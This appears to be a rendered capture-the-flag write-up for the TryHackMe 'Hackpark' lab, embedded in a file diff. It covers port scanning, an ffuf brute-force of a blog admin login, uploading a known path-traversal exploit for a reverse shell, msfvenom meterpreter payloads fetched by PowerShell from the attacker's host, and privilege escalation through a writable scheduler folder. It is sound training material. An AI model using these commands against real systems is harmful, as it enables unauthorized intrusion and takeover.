@@ -1,0 +1,265 @@
+I"�R<h1 id="enumeration">ENUMERATION</h1>
+
+<p>Run Network Mapper (<strong>nmap</strong>) on Hackpark machine to discover opened ports and services.</p>
+
+<p>Full command :</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sV</span> <span class="nt">-sS</span> <span class="nt">-O</span> <span class="nt">-T4</span> <span class="nt">-p-</span> <span class="o">{</span>machine IP<span class="o">}</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> <span class="o">{</span>outputfile<span class="o">}</span></code></pre></figure>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Functionality</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-sV</td>
+      <td style="text-align: left">Probe open ports to determine service/version info</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-sS</td>
+      <td style="text-align: left">SYN, half TCP scan</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-O</td>
+      <td style="text-align: left">Enable OS detection</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-T4</td>
+      <td style="text-align: left">T{0-5} Set scan speed, higher is faster</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-p-</td>
+      <td style="text-align: left">Scan all 65536 ports</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-Pn</td>
+      <td style="text-align: left">Skip host discovery</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-oN</td>
+      <td style="text-align: left">Write output to a file</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Output of the scan:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.92 scan initiated Thu Dec 30 14:40:55 2021 as: nmap -sV -sS -O -T4 -p- -Pn -oN hackpark.nmap 10.10.123.142</span>
+Nmap scan report <span class="k">for </span>10.10.123.142
+Host is up <span class="o">(</span>0.033s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 8.5
+3389/tcp open  ssl/ms-wbt-server?
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device <span class="nb">type</span>: general purpose
+Running <span class="o">(</span>JUST GUESSING<span class="o">)</span>: Microsoft Windows 2012 <span class="o">(</span>89%<span class="o">)</span>
+OS CPE: cpe:/o:microsoft:windows_server_2012
+Aggressive OS guesses: Microsoft Windows Server 2012 <span class="o">(</span>89%<span class="o">)</span>, Microsoft Windows Server 2012 or Windows Server 2012 R2 <span class="o">(</span>89%<span class="o">)</span>, Microsoft Windows Server 2012 R2 <span class="o">(</span>89%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Thu Dec 30 14:43:54 2021 -- 1 IP address (1 host up) scanned in 179.18 seconds</span></code></pre></figure>
+
+<p>Two ports opened:</p>
+
+<h2 id="port-3389-sslms-wbt-server">Port 3389 ssl/ms-wbt-server?</h2>
+<p>Port 3389 is running an <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol">RDP</a> service.
+However, it is not possible to exploit it since we do not have any information about the version of the service.</p>
+
+<h2 id="port-80-http-microsoft-iis-httpd-85">Port 80 http Microsoft IIS httpd 8.5</h2>
+<p><a href="https://en.wikipedia.org/wiki/Internet_Information_Services"><strong>Microsoft IIS</strong></a> web server is running on port 80.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/1.png" alt="" /><br />
+<br /><br />Let us quickly check the <a href="https://www.cloudflare.com/learning/bots/what-is-robots.txt/">robots.txt</a> to see if we can find something interesting.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/3.png" alt="" /><br />
+Nothing fancy here. Let us move on.
+<br /><br /><a href="https://github.com/maurosoria/dirsearch">Dirsearch</a> can help us to enumerate subdirectories of the webserver.
+Frameworks like <strong>GoBuster</strong> and <strong>DirBuster</strong> are also an option.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/2.png" alt="" /><br />
+The <strong>/admin</strong> directory might be interesting. However, the request to the directory gets redirected to a <strong>.aspx</strong> file 
+which is probably a login form.
+<br /><br /><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/4.png" alt="" /><br />
+We will have to launch a <a href="https://www.fortinet.com/resources/cyberglossary/brute-force-attack">brute-force</a> attack in order to
+gain access to the backend panel.
+<br /><br />There is only one blog post published on the main page, and the author of it is the <strong>ADMINISTRATOR</strong>. 
+So we can assume that the only user registered to the panel is the admin’s itself.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/5.png" alt="" /><br /></p>
+
+<h1 id="exploitaton">EXPLOITATON</h1>
+
+<h2 id="brute-forcing-the-panel">Brute-Forcing the Panel</h2>
+<p>In order to create continuous HTTP requests, we have to know how the HTTP request looks.
+Launch the <a href="https://www.geeksforgeeks.org/what-is-burp-suite/"><strong>Burp Suite</strong></a> to examine the HTTP POST request sent 
+when a login attempt occurs.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/6.png" alt="" /><em>HTTP Post Request</em><br /></p>
+
+<p>There are three fields we have to make sure they are being sent with the HTTP request we will forge for this form.</p>
+<ol>
+  <li><a href="https://www.w3.org/TR/html401/interact/forms.html#h-17.13.4"><strong>application/x-www-form-urlencoded</strong></a> header : Encoding type</li>
+  <li><strong>Username</strong> : Username field</li>
+  <li><strong>Password</strong> : Password Field</li>
+</ol>
+
+<p>However, we need to include all the data section when posting the request. Otherwise we cannot get a healthy
+response from the webserver.
+I will use <a href="https://cybersecnerds.com/ffuf-everything-you-need-to-know/"><strong>ffuf</strong></a> to create POST requests toward the web server.
+You can use any fuzzer tool like <strong>THC Hydra</strong>, <strong>Burp Suite</strong> or others. 
+<br />Download <a href="https://github.com/danielmiessler/SecLists"><strong>SecLists</strong></a> repo with prepeared wordlists included.
+Full command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ffuf <span class="nt">-w</span> ~/Folders/pentest/SecLists/Passwords/probable-v2-top1575.txt:W1 <span class="nt">-u</span> <span class="s2">"http://10.10.123.142/Account/login.aspx?ReturnURL=/admin/"</span> <span class="nt">-data</span> <span class="s2">" </span><span class="se">\_\_</span><span class="s2">VIEWSTATE=RH2j6pTwkTpekqaGFxbyyqhRtNI0NqgguLfakdexSgccBsTJEspUlTZqAM4QgzNfGiTveKSyUR8zQcskqfuAHSnpcldHQ9xwsDFI7TPd9qleqBeLqjTEaf0uWEXMNHGHBar%2Fd4Tpi6vKNeoMnRSF9UgcpGiDPoDm%2BS2kBhsBJqJ47zLb&amp;</span><span class="se">\_\_</span><span class="s2">EVENTVALIDATION=iHNLSSqcnyAz7PNrH23YgFZ%2FinxPC1MSAVwjbKwwlbPU53tS7MftBm1t2tI37bKFNo1JvXCIgpZCsBc0Hy0zCU6jPybyZAob4Fm3Pmva7gRSUaDNTTb%2F3QgExGwRutGX4FnCQjvfJVEGodEZUU5p4vr8Xj6oe8MdxUtJM0CobBQGfLLs&amp;ctl00%24MainContent%24LoginUser%24UserName=admin&amp;ctl00%24MainContent%24LoginUser%24Password=W1&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in"</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">-fr</span> <span class="s2">"Login failed"</span></code></pre></figure>
+
+<p>Where:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Parameter</th>
+      <th style="text-align: left">Functionality</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">-w</td>
+      <td style="text-align: left">Dedicated wordlists</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-u</td>
+      <td style="text-align: left">Target URL</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-data</td>
+      <td style="text-align: left">Data which will be sent with the request</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-H</td>
+      <td style="text-align: left">HTTP headers that will be sent with the request</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">-fr</td>
+      <td style="text-align: left">Regex which will be filtered out</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/8.png" alt="" /><em>Starting the attack</em><br />
+Since the password is not strong enough, we have managed to crack it in a matter of seconds.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/10.png" alt="" /><em>Logging in to the panel as the admin.</em>
+<br /><br /></p>
+<h2 id="searching-for-vulnerabilities">Searching for Vulnerabilities</h2>
+<p><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/11.png" alt="" /><em>Checking the version of the framework</em><br />
+After logging in to the panel, under the About tab, we can see the version of the framework is 3.3.6
+<br /><br />After gathering the version information, we can check <a href="https://www.exploit-db.com/exploits/46353">Exploit-db</a> to see
+if there is any vulnerability on that version. I will use the <strong>searchsploit</strong> utility, the CLI version
+of the Exploit-db.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/12.png" alt="" /><br />
+Multiple different exploits showed up. However, the first one is the 3.3.6 version specific. We are going to
+use that. <a href="https://portswigger.net/web-security/file-path-traversal">Click to read more about <em>File Path, Directory Traversal</em></a>.
+<br /><br /></p>
+<h2 id="hacking-into-the-users-shell">Hacking into the user’s shell</h2>
+<p>Download the exploit, open up a text editor and change the highlighted parameters in the picture below with your THM IP and a free port.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/13.png" alt="" /><em>Editing 46353.cs file</em><br />
+Rename the file as <strong>PostView.ascx</strong>.
+<br /><br />Navigate to the Content tab, then click on the blog post to access the editor.
+Interact with the file manager to upload the exploit.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/13-1.png" alt="" /><em>File manager icon</em><br />
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/14.png" alt="" /><em>Uploading the exploit</em><br />
+<br />Make sure the post is saved to its’ newer version.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/15.png" alt="" /><em>Updating the blogpost</em><br />
+<br />Start a <strong>netcat</strong> listener on your machine with the port that is defined in the exploit.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/16.png" alt="" /><br />
+<br />To trigger the <strong>PostView.ascx</strong> file and get the reverse shell send a GET request to this
+URL: <strong>http://{MACHINE IP}/?theme=../../App_Data/files</strong><br />
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/17.png" alt="" /><br />
+<br />Exploit worked like a charm, and we got our shell.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/18.png" alt="" /><br />
+<br /></p>
+<h2 id="upgrading-to-the-meterpreter">Upgrading to the Meterpreter</h2>
+<p>Since the shell we got is a poor Netcat shell, it would be better to get a <strong>meterpreter</strong> session
+to facilitate our scans in the system.<br /><br />
+Let’s create a meterpreter reverse shell binary with <a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/">msfvenom</a>. 
+After successful creation, we need to upload this binary to the target machine. The shortest way to 
+do it is to start a Python server.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">msfvenom</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">windows/meterpreter/reverse_tcp</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">x86</span><span class="w"> </span><span class="nt">--encoder</span><span class="w"> </span><span class="nx">x86/shikata_ga_nai</span><span class="w"> </span><span class="nx">LHOST</span><span class="o">=</span><span class="p">{</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">}</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="p">{</span><span class="n">SOME</span><span class="w"> </span><span class="nx">FREE</span><span class="w"> </span><span class="nx">PORT</span><span class="p">}</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="n">exe</span><span class="w"> </span><span class="nx">revshell.exe</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">sudo</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span></code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/19.png" alt="" /><em>Creating meterpreter backdoor and starting a Python server</em><br />
+<br /><br />Download the backdoor to the target system with the following Powershell commands:</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">cd</span><span class="w"> </span><span class="s2">"C:\Windows\Temp"</span><span class="w">
+</span><span class="n">mkdir</span><span class="w"> </span><span class="nx">myfolder</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">myfolder</span><span class="w">
+</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"Invoke-WebRequest http://{THM IP}:{PORT}/{FILE_NAME} -OutFile .\revshell.exe"</span></code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/20.png" alt="" /><br />
+<br /><br />We need to have a listener to accept incoming meterpreter connection.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfconsole <span class="nt">-q</span>
+handler <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nt">-H</span> <span class="o">{</span>THM IP<span class="o">}</span> <span class="nt">-P</span> <span class="o">{</span>THE PORT DEFINED IN THE BACKDOOR<span class="o">}</span></code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/22.png" alt="" /><br />
+<br />Go back to the Netcat console, then run the backdoor as a background process with this command.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/21.png" alt="" /><br />
+<br />Excellent! We got the meterpreter session.
+Right now, our control on the system is much more powerful than before.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/22-2.png" alt="" />
+<br /><br /></p>
+<h2 id="privilege-escelation">Privilege Escelation</h2>
+<p>After gaining access to the system as a low-level user, it is time to get administrator privileges to have much more 
+permissions against the system. <strong>PowerUp.ps1</strong> is a program that facilitates fast checks in a windows machine to identify 
+any misconfigurations and privilege escalation possibilities.
+<br /><a href="https://github.com/krygeNNN/krygeNNN.github.io/blob/main/assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1"><strong>Download PowerUp.ps1</strong></a>
+<br /><a href="https://github.com/PowerShellMafia/PowerSploit"><strong>PowerSploit GitHub Repo</strong></a>
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/23.png" alt="" /><em>Uploading the PowerUp.ps1 Powershell script to the target system.</em><br />
+<br /><br />Since this is a Powershell script, we need to have a Powershell instead of a regular windows command prompt.
+<br />-Load the Powershell module and summon it.
+<br />-Import the script as a powershell module.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerUp.ps1</span><span class="w">
+</span><span class="n">Invoke-AllChecks</span></code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/24.png" alt="" /><br />
+<br /><strong>InvokeAllChecks</strong> will diagnose any detectable vulnerabilities along with their descriptions.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/25.png" alt="" /><br />
+<br /><br />
+One of the results is worth paying attention to. There is a Windows Scheduler service autoruns at the system logon. 
+The problem is that everyone can modify all the files stored in the directory that contains 
+W3Scheduler.exe. Since the scheduler is run with admin privileges, 
+I can run my malicious executables with admin privileges by replacing the W3Scheduler.exe.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/26.png" alt="" /><br />
+<br /><br />
+Let’s check the the <a href="https://networkencyclopedia.com/discretionary-access-control-list-dacl/"><strong>DACL(Discretionary Access Control List)</strong></a> of the ‘C:\Program Files (x86)\SystemScheduler’ with <a href="https://www.techtarget.com/searchwindowsserver/definition/icacls"><strong>icacls</strong></a>. 
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/27.png" alt="" /><br />
+It is obvious that everyone have modify permission on this folder.
+<br /><br /> Let’s see what the directory contains along with W3Scheduler.exe
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/28.png" alt="" /><br />
+<br /><br />Replacing the W3Scheduler.exe with a backdoor would not work since it is a virtual box and once
+rebooted, it will reset itself to factory settings. That is why we need to dig further to find out how
+to walk around this.
+<br /><br />There is a log file in the directory, let’s see what is inside.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/29.png" alt="" /><br />
+The scheduler executes a binary called Messages.exe every 23 seconds. 
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/30.png" alt="" /><br />
+This binary is also in the modifiable directory. If we create a 
+backdoor and put it where Message.exe sits, we can escalate our privileges.
+<br /><br />Once again, let’s create a meterpreter reverse shell binary.</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">msfvenom</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">windows/meterpreter/reverse_tcp</span><span class="w"> </span><span class="nt">-a</span><span class="w"> </span><span class="nx">x86</span><span class="w"> </span><span class="nt">--encoder</span><span class="w"> </span><span class="nx">x86/shikata_ga_nai</span><span class="w"> </span><span class="nx">LHOST</span><span class="o">=</span><span class="p">{</span><span class="n">THM</span><span class="w"> </span><span class="nx">IP</span><span class="p">}</span><span class="w"> </span><span class="n">LPORT</span><span class="o">=</span><span class="p">{</span><span class="n">SOME</span><span class="w"> </span><span class="nx">FREE</span><span class="w"> </span><span class="nx">PORT</span><span class="p">}</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="n">exe</span><span class="w"> </span><span class="nx">revshell.exe</span></code></pre></figure>
+
+<p>Then start the python server.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">sudo</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span> <span class="mi">80</span></code></pre></figure>
+
+<p><img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/31.png" alt="" /><br />
+<br />Start the multi handler listener.
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/32.png" alt="" /><br />
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/33.png" alt="" /><br />
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/34.png" alt="" /><br />
+<img src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/35.png" alt="" /><br /></p>
+:ET
